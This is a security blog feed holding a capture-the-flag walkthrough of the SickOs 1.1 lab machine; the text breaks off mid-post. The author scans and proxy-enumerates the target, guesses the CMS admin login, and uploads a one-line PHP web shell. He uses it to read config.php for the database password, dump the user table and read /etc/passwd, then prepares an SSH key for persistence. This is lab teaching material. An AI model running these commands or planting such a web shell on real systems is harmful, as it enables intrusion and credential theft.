<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vulnhub | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-12-12T12:58:22+01:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SickOs: 1.1]]></title>
    <link href="http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1/"/>
    <updated>2015-12-12T11:21:39+01:00</updated>
    <id>http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nmap 192.168.80.169
</span><span class='line'>22/tcp   open   ssh
</span><span class='line'>3128/tcp open   squid-http
</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure></p>

<p>There is an open proxy, we try internal network reconnaissance:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169">http://192.168.80.169&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>
</span><span class='line'>BLEHHH!!!
</span><span class='line'>&lt;/h1>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ dirb &lt;a href="http://192.168.80.169:80">http://192.168.80.169:80&lt;/a> -p 192.168.80.169:3128
</span><span class='line'>&hellip;
</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/cgi-bin/">http://192.168.80.169:80/cgi-bin/&lt;/a> (CODE:403|SIZE:290)
</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect&lt;/a> (CODE:200|SIZE:109)
</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/index">http://192.168.80.169:80/index&lt;/a> (CODE:200|SIZE:21)
</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/index.php">http://192.168.80.169:80/index.php&lt;/a> (CODE:200|SIZE:21)
</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/robots">http://192.168.80.169:80/robots&lt;/a> (CODE:200|SIZE:45)
</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt&lt;/a> (CODE:200|SIZE:45)
</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/server-status">http://192.168.80.169:80/server-status&lt;/a> (CODE:403|SIZE:295)</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt&lt;/a>
</span><span class='line'>User-agent: *
</span><span class='line'>Disallow: /
</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>!/usr/bin/python&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>print &ldquo;I Try to connect things very frequently\n&rdquo;
</span><span class='line'>print &ldquo;You may want to try my services&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/wolfcms/">http://192.168.80.169:80/wolfcms/&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>We found the Wolf CMS and to have easier access, we set the HTTP proxy in
Firefox. After a little googling, we found this
<a href="https://www.exploit-db.com/exploits/36818/">exploit</a>, but it only uploads php
shell and we can do this manually. To use this technique, we need credentials to log in via
<a href="http://192.168.80.169/wolfcms/?/admin/">admin interface</a>. One of our first guesses was
<code>admin/admin</code>, so we upload the file with the following content for RCE:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>As we can read in exploit, the uploaded files are available in <code>public</code> directory. Invoking a few commands:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la&lt;/a>
</span><span class='line'>total 20
</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec 12 12:25 .
</span><span class='line'>drwxr-xr-x 5 root     root     4096 Dec  5 06:33 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   32 Dec 12 12:29 a.php
</span><span class='line'>drwxrwxrwx 2 root     root     4096 Dec  5 06:05 images
</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec  5 06:05 themes</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../&lt;/a>&rdquo;
</span><span class='line'>total 52
</span><span class='line'>drwxr-xr-x 5 root root 4096 Dec  5 06:33 .
</span><span class='line'>drwxrwxrwx 3 root root 4096 Dec  6 21:15 ..
</span><span class='line'>-rwxr-xr-x 1 root root  950 Dec  5 06:15 .htaccess
</span><span class='line'>-rwxrwxrwx 1 root root 4084 Dec  5 06:15 CONTRIBUTING.md
</span><span class='line'>-rwxrwxrwx 1 root root 2405 Dec  5 06:15 README.md
</span><span class='line'>-rwxrwxrwx 1 root root  403 Dec  5 06:15 composer.json
</span><span class='line'>-rwxrwxrwx 1 root root 3058 Dec  5 07:26 config.php
</span><span class='line'>drwxrwxrwx 2 root root 4096 Dec  5 06:15 docs
</span><span class='line'>-rwxrwxrwx 1 root root  894 Dec  5 06:15 favicon.ico
</span><span class='line'>-rwxrwxrwx 1 root root 6815 Dec  5 06:32 index.php
</span><span class='line'>drwxrwxrwx 4 root root 4096 Dec 12 12:25 public
</span><span class='line'>-rwxrwxrwx 1 root root    0 Dec  5 06:15 robots.txt
</span><span class='line'>drwxrwxrwx 7 root root 4096 Dec  5 06:25 wolf</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp">http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp&lt;/a>
</span><span class='line'>Active Internet connections (servers and established)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span><span class='line'>tcp        0      0 127.0.0.1:3306          0.0.0.0:&lt;em>               LISTEN      -
</span><span class='line'>tcp        0      0 0.0.0.0:80              0.0.0.0:&lt;/em>               LISTEN      -
</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;em>               LISTEN      -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60664    TIME_WAIT   -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60665    TIME_WAIT   -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60667    ESTABLISHED -
</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60666    TIME_WAIT   -
</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60662    CLOSE_WAIT  -
</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60663    CLOSE_WAIT  -
</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60661    CLOSE_WAIT  -
</span><span class='line'>tcp6       0      0 :::22                   :::&lt;/em>                    LISTEN      -
</span><span class='line'>tcp6       0      0 :::3128                 :::&lt;em>                    LISTEN      -
</span><span class='line'>tcp6       0      0 192.168.80.169:60667    192.168.80.169:80       ESTABLISHED -
</span><span class='line'>tcp6       0      0 192.168.80.169:3128     192.168.80.137:54390    ESTABLISHED -
</span><span class='line'>udp        0      0 192.168.80.169:45534    192.168.80.2:53         ESTABLISHED 1703/netstat
</span><span class='line'>udp        0      0 192.168.80.169:37938    192.168.80.2:53         ESTABLISHED 1701/netstat
</span><span class='line'>udp        0      0 0.0.0.0:68              0.0.0.0:&lt;/em>                           -
</span><span class='line'>udp        0      0 192.168.80.169:39007    192.168.80.2:53         ESTABLISHED 1705/netstat
</span><span class='line'>udp        0      0 0.0.0.0:53488           0.0.0.0:*                           -
</span><span class='line'>udp6       0      0 :::43051</span></code></pre></td></tr></table></div></figure></p>

<p>Here we found the database user credentials:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php&lt;/a>&rdquo;
</span><span class='line'>&lt;?php&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>// Database information:
</span><span class='line'>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
</span><span class='line'>// The path can only be absolute path or :memory:
</span><span class='line'>// For more info look at: www.php.net/pdo&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>// Database settings:
</span><span class='line'>define(&lsquo;DB_DSN&rsquo;, &lsquo;mysql:dbname=wolf;host=localhost;port=3306&rsquo;);
</span><span class='line'>define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
</span><span class='line'>define(&lsquo;DB_PASS&rsquo;, &lsquo;john@123&rsquo;);
</span><span class='line'>define(&lsquo;TABLE_PREFIX&rsquo;, &lsquo;&rsquo;);
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>Examining the MySQL database:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status&lt;/a>&rdquo;
</span><span class='line'>mysql -uroot -pjohn@123 -e status&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status&lt;/a>&rdquo;&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>mysql  Ver 14.14 Distrib 5.5.46, for debian-linux-gnu (i686) using readline 6.2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Connection id:          149
</span><span class='line'>Current database:
</span><span class='line'>Current user:           root@localhost
</span><span class='line'>SSL:                    Not in use
</span><span class='line'>Current pager:          stdout
</span><span class='line'>Using outfile:          &lsquo;&rsquo;
</span><span class='line'>Using delimiter:        ;
</span><span class='line'>Server version:         5.5.46-0ubuntu0.12.04.2 (Ubuntu)
</span><span class='line'>Protocol version:       10
</span><span class='line'>Connection:             Localhost via UNIX socket
</span><span class='line'>Server characterset:    latin1
</span><span class='line'>Db     characterset:    latin1
</span><span class='line'>Client characterset:    latin1
</span><span class='line'>Conn.  characterset:    latin1
</span><span class='line'>UNIX socket:            /var/run/mysqld/mysqld.sock
</span><span class='line'>Uptime:                 1 hour 1 min 49 sec&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Threads: 1  Questions: 2646  Slow queries: 0  Opens: 64  Flush tables: 1  Open tables: 57  Queries per second avg: 0.713&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e&lt;/a>'show+databases'&rdquo;
</span><span class='line'>Database
</span><span class='line'>information_schema
</span><span class='line'>mysql
</span><span class='line'>performance_schema
</span><span class='line'>wolf</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e&lt;/a>'show+tables'&rdquo;
</span><span class='line'>Tables_in_wolf
</span><span class='line'>cron
</span><span class='line'>layout
</span><span class='line'>page
</span><span class='line'>page_part
</span><span class='line'>page_tag
</span><span class='line'>permission
</span><span class='line'>plugin_settings
</span><span class='line'>role
</span><span class='line'>role_permission
</span><span class='line'>secure_token
</span><span class='line'>setting
</span><span class='line'>snippet
</span><span class='line'>tag
</span><span class='line'>user
</span><span class='line'>user_role</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e&lt;/a>'select+*+from+user'&rdquo;
</span><span class='line'>id      name    email   username        password        salt    language        last_login      last_failure    failure_count   created_on      updated_on created_by_id   updated_by_id
</span><span class='line'>1       Administrator   &lt;a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#121;&#x6f;&#x75;&#114;&#x73;&#105;&#x74;&#101;&#x2e;&#x63;&#111;&#x6d;">&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x79;&#x6f;&#x75;&#114;&#115;&#105;&#x74;&#101;&#46;&#99;&#111;&#x6d;&lt;/a>      admin   3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f   6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167        en      2015-12-12 12:23:33     NULL       0       2015-12-05 06:25:06     2015-12-12 12:23:33     1       NULL</span></code></pre></td></tr></table></div></figure></p>

<p>Nothing interesting here, there is only one user and we already know his password.</p>

<p>We noticed that the user <code>www-data</code> has shell access:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd&lt;/a>&rdquo;
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false</span></code></pre></td></tr></table></div></figure></p>

<p>Next idea is to upload ssh authorization key and log in via ssh.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=id">http://192.168.80.169/wolfcms/public/a.php?cmd=id&lt;/a>&rdquo;
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data&lt;/a>&rdquo;
</span><span class='line'>total 24
</span><span class='line'>drwxrwxrwx  3 root root 4096 Dec  6 21:15 .
</span><span class='line'>drwxr-xr-x 13 root root 4096 Dec 12 11:55 ..
</span><span class='line'>-rwxrwxrwx  1 root root  109 Dec  5 07:57 connect.py
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   21 Dec  5 06:05 index.php
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   45 Dec  5 06:05 robots.txt
</span><span class='line'>drwxr-xr-x  5 root root 4096 Dec  5 06:33 wolfcms&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh&lt;/a>&rdquo;
</span><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data&lt;/a>&rdquo;
</span><span class='line'>total 28
</span><span class='line'>drwxrwxrwx  4 root     root     4096 Dec 12 13:07 .
</span><span class='line'>drwxr-xr-x 13 root     root     4096 Dec 12 11:55 ..
</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 Dec 12 13:07 .ssh
</span><span class='line'>-rwxrwxrwx  1 root     root      109 Dec  5 07:57 connect.py
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root     root       21 Dec  5 06:05 index.php
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root     root       45 Dec  5 06:05 robots.txt
</span><span class='line'>drwxr-xr-x  5 root     root     4096 Dec  5 06:33 wolfcms</span></code></pre></td></tr></table></div></figure></p>

<p>Creating ssh keypair:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh-keygen -P &ldquo;&rdquo; -f blabla
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Your identification has been saved in blabla.
</span><span class='line'>Your public key has been saved in blabla.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>4d:31:fb:7e:bd:82:c9:7f:21:ce:51:91:f3:76:a3:14 root@kali32
</span><span class='line'>The key&rsquo;s randomart image is:
</span><span class='line'>+&mdash;[RSA 2048]&mdash;-+
</span><span class='line'>|          o     .|
</span><span class='line'>|           + E + |
</span><span class='line'>|          o   . +|
</span><span class='line'>|         o . . o+|
</span><span class='line'>|        S . o o.o|
</span><span class='line'>|           . + o |
</span><span class='line'>|          . * + o|
</span><span class='line'>|           + = ..|
</span><span class='line'>|            ..o. |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~$ cat blabla.pub
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure></p>

<p>To encode spaces:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
